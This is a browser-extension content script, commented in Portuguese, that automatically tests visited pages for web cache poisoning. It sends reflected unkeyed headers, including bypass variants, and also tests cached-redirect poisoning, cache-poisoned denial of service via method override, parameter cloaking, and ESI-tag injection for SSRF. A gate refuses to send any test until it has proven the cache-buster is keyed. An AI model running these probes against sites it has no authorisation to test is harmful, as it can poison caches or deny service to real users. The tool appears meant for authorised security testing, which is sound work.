// Cache Poisoning Hunter — content script (ISOLATED world).
//
// Metodologia (PortSwigger + Intigriti), implementada com regra de ouro:
//   PASSO 0 (portão): provar que o cache-buster (param zzcp*) É keyed —
//     request A 2x → HIT; request B → MISS. Se não provar, NÃO roda teste
//     nenhum (buster não-keyed envenenaria usuário real — proibido).
//   PASSO 1 (reflexão): header candidato + canary único + buster único →
//     canary refletido em src=/href=/content=/action=/corpo?
//   PASSO 2 (reuso): mesma chave (buster) SEM o header → resposta ainda
//     contém o canary (+ evidência HIT/Age) = resposta envenenada em cache.
//   PASSO 3 (variantes): redirect (301 com canary no destino) e CPDoS
//     (X-HTTP-Method-Override → erro 4xx/5xx cacheado).
//
// fetch com cache:'no-store' SEMPRE: o cache do NAVEGADOR não pode mascarar
// o cache do servidor/CDN.
// Resultados: toast na página, div #__cpsniper_debug, popup via background.
'use strict';
(function () {
  var HDRS = [
    ['X-Forwarded-Host', 'host/canonical/script'],
    ['X-Forwarded-Scheme', 'scheme em URLs'],
    ['X-Forwarded-Port', 'porta (DoS)'],
    ['X-Forwarded-Proto', 'proto em URLs'],
    ['X-Forwarded-For', 'ip refletido'],
    ['X-Host', 'host alternativo'],
    ['X-Original-URL', 'rota/URL'],
    ['X-Rewrite-URL', 'rota/URL'],
    ['X-HTTP-Method-Override', 'CPDoS'],
    ['Forwarded', 'RFC 7239'],
    ['X-Real-IP', 'ip'],
    ['Accept-Language', 'locale'],
    ['X_Forwarded_Host', 'bypass underscore'],
    ['X.Forwarded.Host', 'bypass ponto']
  ];
  // headers que podem gerar redirect (301/302 com Location) — testados no passo 3
  var HDRS_REDIR = ['X-Forwarded-Host', 'X-Forwarded-Scheme', 'X-Host',
    'X-Original-URL', 'X-Rewrite-URL', 'X_Forwarded_Host', 'X.Forwarded.Host'];

  var state = { passivo: [], gate: null, testes: [], running: false };
  var AUTOTEST = new URL(location.href).searchParams.has('__cp_autotest');
  var SNIPER = false; // modo sniper: roda sozinho ao navegar (liga no popup)

  // ---------- utilidades ----------
  function rand4() { return Math.random().toString(36).slice(2, 6); }
  function bust(u, tag) {
    var x = new URL(u);
    x.searchParams.set('zzcp' + tag, rand4());
    return x.href;
  }
  function fget(url, hdrs) {
    return fetch(url, { credentials: 'same-origin', cache: 'no-store', headers: hdrs || {} });
  }
  function hdr(name, val) { var o = {}; o[name] = val; return o; }

  function cacheHeaders(h) {
    var out = [];
    ['x-cache', 'x-cache-status', 'cf-cache-status', 'age', 'cache-control',
      'vary', 'via', 'x-served-by', 'server', 'x-cache-hits'].forEach(function (k) {
      var v = h.get(k);
      if (v != null) out.push(k + ': ' + v);
    });
    return out;
  }
  function isHit(r) {
    if (!r || !r.headers) return false;
    var h = r.headers;
    if (h.get('age') != null) return true;
    var xc = [h.get('x-cache'), h.get('x-cache-status'), h.get('cf-cache-status'),
      h.get('x-cache-hits'), h.get('cdn-cache')].join(' ');
    return /hit/i.test(xc) && !/miss/i.test(xc);
  }
  function reflectCtx(body, canary) {
    if (body.indexOf(canary) === -1) return null;
    var ctx = [];
    if (/src\s*=\s*["'][^"']*cpz/i.test(body.replace(canary, 'cpzMARK'))) ctx.push('src=');
    if (/href\s*=\s*["'][^"']*cpzMARK/.test(body.replace(canary, 'cpzMARK'))) ctx.push('href=');
    if (/content\s*=\s*["'][^"']*cpzMARK/.test(body.replace(canary, 'cpzMARK'))) ctx.push('meta/OG');
    if (/action\s*=\s*["'][^"']*cpzMARK/.test(body.replace(canary, 'cpzMARK'))) ctx.push('action=');
    if (!ctx.length) ctx.push('corpo');
    return ctx.join(', ');
  }

  // ---------- UI: toast + debug ----------
  var toastBox = null;
  function toast(lines) {
    try {
      if (!toastBox) {
        toastBox = document.createElement('div');
        toastBox.id = '__cp_toast';
        toastBox.style.cssText =
          'position:fixed;bottom:12px;right:12px;z-index:2147483645;max-width:460px;' +
          'background:#101418;color:#d7dae0;border:1px solid #333;border-radius:8px;' +
          'padding:8px 10px;font:11px/1.5 monospace;box-shadow:0 4px 16px rgba(0,0,0,.55)';
        document.documentElement.appendChild(toastBox);
      }
      toastBox.textContent = '';
      lines.forEach(function (l) {
        var div = document.createElement('div');
        if (l && typeof l === 'object' && l.url) {
          var a = document.createElement('a');
          a.textContent = l.label;
          a.href = l.url;
          a.target = '_blank';
          a.rel = 'noopener';
          a.style.cssText = 'color:#7dd3fc;display:block;margin:3px 0;text-decoration:underline';
          div.appendChild(a);
        } else {
          div.textContent = l;
          div.style.cssText = l.indexOf('CONFIRMADO') === 0 ? 'color:#4ade80' :
            (l.indexOf('ATENÇÃO') === 0 || l.indexOf('BLOQUEADO') === 0 ? 'color:#f87171' : '');
        }
        toastBox.appendChild(div);
      });
      var close = document.createElement('div');
      close.textContent = '[fechar]';
      close.style.cssText = 'margin-top:5px;color:#777;cursor:pointer';
      close.onclick = function () { toastBox.remove(); toastBox = null; };
      toastBox.appendChild(close);
      setTimeout(function () { if (toastBox) { toastBox.remove(); toastBox = null; } }, 25000);
    } catch (e) {}
  }

  function debug() {
    try {
      var d = document.getElementById('__cpsniper_debug');
      if (!d) {
        d = document.createElement('div');
        d.id = '__cpsniper_debug';
        d.style.display = 'none';
        document.documentElement.appendChild(d);
      }
      d.textContent = JSON.stringify({ url: location.href, passivo: state.passivo, gate: state.gate, testes: state.testes });
    } catch (e) {}
  }

  function sendBg(msg) {
    try { chrome.runtime.sendMessage(msg, function () { void chrome.runtime.lastError; }); } catch (e) {}
  }
  function pushTeste(t) {
    state.testes.push(t);
    sendBg({ type: 'cp-result', state: publicState() });
    debug();
  }
  function publicState() {
    return { url: location.href, passivo: state.passivo, gate: state.gate, testes: state.testes };
  }

  // ---------- PASSIVO: detectar cache/CDN ----------
  function passive() {
    var u = bust(location.href, 'p');
    fget(u).then(function (r) {
      var ch = cacheHeaders(r.headers);
      if (ch.length) {
        state.passivo.push({ msg: 'cache/CDN detectado nesta URL — ' + ch.join('; '), high: true });
      } else {
        state.passivo.push({ msg: 'sem headers de cache visíveis (Age/X-Cache/CF-...) — pode não ter cache nesta URL', high: false });
      }
      var vary = r.headers.get('vary');
      if (vary) {
        state.passivo.push({ msg: 'Vary: ' + vary + ' — headers listados aí SÃO keyed (não testáveis por aqui)', high: false });
      }
      sendBg({ type: 'cp-result', state: publicState() });
      debug();
      if (AUTOTEST || (SNIPER && ch.length)) setTimeout(runTests, 500);
    }).catch(function () {
      state.passivo.push({ msg: 'fetch falhou (CSP/offline?) — não dá pra testar', high: false });
      sendBg({ type: 'cp-result', state: publicState() });
      debug();
    });
  }

  // ---------- PASSO 0: portão — provar que o buster É keyed ----------
  function gate() {
    var a = bust(location.href, 'gA');
    var b = bust(location.href, 'gB');
    return fget(a).then(function () {
      return fget(a);
    }).then(function (r2) {
      var hit2 = isHit(r2);
      return fget(b).then(function (r3) {
        var miss3 = !isHit(r3);
        return {
          keyed: hit2 && miss3, hit2: hit2, miss3: miss3,
          dbg: 'r2:' + cacheHeaders(r2.headers).join(';') + ' | r3:' + cacheHeaders(r3.headers).join(';') +
            ' | r3.url:' + (r3.url || '').slice(0, 80)
        };
      });
    });
  }

  // ---------- testes ----------
  function testReflect(H, canary) {
    var u = bust(location.href, 'r');
    return fget(u, hdr(H, canary)).then(function (r1) {
      var r1hit = isHit(r1);
      return r1.text().then(function (t1) {
        var ctx = reflectCtx(t1, canary);
        if (!ctx) return { header: H, tipo: 'reflexão', refletido: false };
        return fget(u).then(function (r2) {
          return r2.text().then(function (t2) {
            var ok = t2.indexOf(canary) !== -1;
            var t = {
              header: H, tipo: 'reflexão', refletido: true, ctx: ctx,
              cacheado: ok, hit: isHit(r2), status2: r2.status, r1hit: r1hit,
              pocUrl: u
            };
            // classificação de impacto: script src envenenado = XSS
            if (ok && ctx.indexOf('src=') !== -1) t.tipo = 'XSS-src-envenenado';
            return t;
          });
        });
      });
    }).catch(function () { return { header: H, tipo: 'reflexão', refletido: false, nota: 'erro' }; });
  }

  function testRedirect(H, canary) {
    var u = bust(location.href, 'd');
    return fget(u, hdr(H, canary)).then(function (r1) {
      var refl = (r1.url || '').indexOf(canary) !== -1;
      if (!refl) return { header: H, tipo: 'redirect', refletido: false };
      return fget(u).then(function (r2) {
        var ok = (r2.url || '').indexOf(canary) !== -1;
        return {
          header: H, tipo: 'redirect', refletido: true,
          cacheado: ok, hit: isHit(r2), status2: r2.status,
          alvo: (r2.url || '').slice(0, 120)
        };
      });
    }).catch(function () { return { header: H, tipo: 'redirect', refletido: false, nota: 'erro (destino externo?)' }; });
  }

  function testCPDoS(H, canary) {
    var u = bust(location.href, 'e');
    return fget(u, hdr(H, canary)).then(function (r1) {
      if (r1.status < 400) return { header: H, tipo: 'CPDoS', refletido: false, status1: r1.status };
      return fget(u).then(function (r2) {
        var ok = r2.status >= 400 && isHit(r2);
        return {
          header: H, tipo: 'CPDoS', refletido: true,
          cacheado: ok, hit: isHit(r2), status1: r1.status, status2: r2.status
        };
      });
    }).catch(function () { return { header: H, tipo: 'CPDoS', refletido: false, nota: 'erro' }; });
  }

  // param cloaking: param duplicado — backend usa um valor, cache chaveia outro
  // (zzcpQ=c&zzcpQ=k: se a resposta reflete c e a chave guarda k, pedir só k
  //  devolve o conteúdo de c → envenenamento sutil de chave)
  function testCloak() {
    var c = 'cpz' + rand4();
    var k = 'k' + rand4();
    var u = new URL(location.href);
    u.search = (u.search ? u.search + '&' : '?') + 'zzcpQ=' + c + '&zzcpQ=' + k;
    return fget(u.href).then(function (r1) {
      return r1.text().then(function (t1) {
        if (t1.indexOf(c) === -1) return { tipo: 'cloaking', refletido: false, header: 'zzcpQ duplicado' };
        var u2 = new URL(location.href);
        u2.search = (u2.search ? u2.search + '&' : '?') + 'zzcpQ=' + k;
        return fget(u2.href).then(function (r2) {
          return r2.text().then(function (t2) {
            var ok = t2.indexOf(c) !== -1;
            return {
              tipo: 'cloaking', header: 'zzcpQ duplicado', refletido: true,
              cacheado: ok, hit: isHit(r2), status2: r2.status, pocUrl: u2.href
            };
          });
        });
      });
    }).catch(function () { return { tipo: 'cloaking', header: 'zzcpQ duplicado', refletido: false, nota: 'erro' }; });
  }

  // ESI: injeta tag <esi:include> via header refletido — se o edge PROCESSAR
  // (tag some/substituída na resposta) = SSRF/RCE no CDN (path clássico de RCE
  // por cache poisoning). Só roda quando algum header já refletiu.
  function testESI(H) {
    var tag = '<esi:include src="http://127.0.0.1:9987/__esi_' + rand4() + '"/>';
    var u = bust(location.href, 'esi');
    return fget(u, hdr(H, tag)).then(function (r1) {
      return r1.text().then(function (t1) {
        var cru = t1.indexOf('<esi:include') !== -1 || t1.indexOf('&lt;esi:include') !== -1;
        return {
          header: H, tipo: 'ESI', refletido: true, esi: !cru, cacheado: false,
          hit: isHit(r1),
          msg: cru ? 'tag crua — ESI não processado' : 'tag processada/removida pelo edge (SSRF/RCE path)'
        };
      });
    }).catch(function () { return null; });
  }

  function runTests() {
    if (state.running) return;
    state.running = true;
    toast(['[Cache Poisoning Hunter]', 'passo 0: provando que o cache-buster isola a chave...']);

    gate().then(function (g) {
      state.gate = g;
      if (!g.keyed) {
        toast(['BLOQUEADO: não consegui provar que o cache-buster é keyed.',
          'Se a query NÃO fizer parte da chave, o teste envenenaria usuário real.',
          'Nenhum teste ativo foi enviado. (cache ausente ou query unkeyed)']);
        state.running = false;
        sendBg({ type: 'cp-result', state: publicState() });
        debug();
        return;
      }
      toast(['✓ buster keyed comprovado (HIT no repeat, MISS na chave nova).',
        'rodando testes seguros: 1 request envenenada por header, só na MINHA chave...']);

      var idx = 0;
      function nextH() {
        if (idx >= HDRS.length) {
          // extras de sniper: param cloaking + ESI nos headers que refletiram
          extras().then(finish);
          return;
        }
        var H = HDRS[idx++][0];
        var canary = 'cpz' + rand4();
        testReflect(H, canary).then(function (t) {
          if (t.refletido || t.cacheado) pushTeste(t);
          if (HDRS_REDIR.indexOf(H) === -1) {
            if (H === 'X-HTTP-Method-Override') {
              return testCPDoS(H, canary).then(function (t3) {
                if (t3.refletido || t3.cacheado) pushTeste(t3);
              });
            }
            return null;
          }
          return testRedirect(H, canary).then(function (t2) {
            if (t2.refletido || t2.cacheado) pushTeste(t2);
            if (H === 'X-HTTP-Method-Override') {
              return testCPDoS(H, canary).then(function (t3) {
                if (t3.refletido || t3.cacheado) pushTeste(t3);
              });
            }
            return null;
          });
        }).catch(function () {}).then(function () {
          setTimeout(nextH, 250);
        });
      }

      function extras() {
        var tasks = [testCloak];
        // ESI só p/ headers com reflexão no CORPO (ctx) — redirect engole a tag
        // na Location e daria falso positivo
        state.testes.filter(function (t) { return t.refletido && t.ctx && t.header; })
          .slice(0, 2).forEach(function (t) {
            tasks.push(function () { return testESI(t.header); });
          });
        return tasks.reduce(function (p, f) {
          return p.then(function () {
            return Promise.resolve().then(f).then(function (r) {
              if (r && (r.cacheado || r.esi)) pushTeste(r);
            }).catch(function () {});
          });
        }, Promise.resolve());
      }

      function finish() {
        state.running = false;
        sendBg({ type: 'cp-result', state: publicState() });
        debug();
        var lines = ['[Cache Poisoning Hunter] — fim'];
        state.testes.forEach(function (t) {
          if (t.esi) lines.push('CONFIRMADO [ESI] ' + t.header + ' — ' + t.msg);
          else if (t.cacheado) lines.push('CONFIRMADO [' + t.tipo + '] ' + t.header +
            (t.ctx ? ' (' + t.ctx + ')' : '') + (t.hit ? ' — HIT' : ''));
          else if (t.refletido) lines.push('refletido (não cacheou): ' + t.header + (t.ctx ? ' (' + t.ctx + ')' : ''));
        });
        if (!state.testes.length) lines.push('nenhum header refletido nesta página');
        // PoC de 1 clique: abre a página envenenada SEM o header (só o buster na chave)
        state.testes.filter(function (t) { return t.cacheado && t.pocUrl; })
          .slice(0, 2).forEach(function (t) {
            lines.push({ label: '🔗 abrir envenenado (' + t.header + ') — sem header', url: t.pocUrl });
          });
        toast(lines);
      }

      nextH();
    }).catch(function () {
      state.running = false;
      toast(['erro no portão (fetch falhou) — testes abortados']);
      sendBg({ type: 'cp-result', state: publicState() });
      debug();
    });
  }

  // ---------- mensagens ----------
  chrome.runtime.onMessage.addListener(function (msg, _sender, sendResponse) {
    if (!msg) return;
    if (msg.type === 'cp-run') {
      runTests();
      sendResponse({ started: true });
    } else if (msg.type === 'cp-get-state') {
      sendResponse(publicState());
    }
  });

  // ---------- boot ----------
  try {
    chrome.storage.local.get('sniper', function (v) {
      SNIPER = !!(v && v.sniper);
    });
  } catch (e) {}
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function () { setTimeout(passive, 1000); });
  } else {
    setTimeout(passive, 1000);
  }
})();
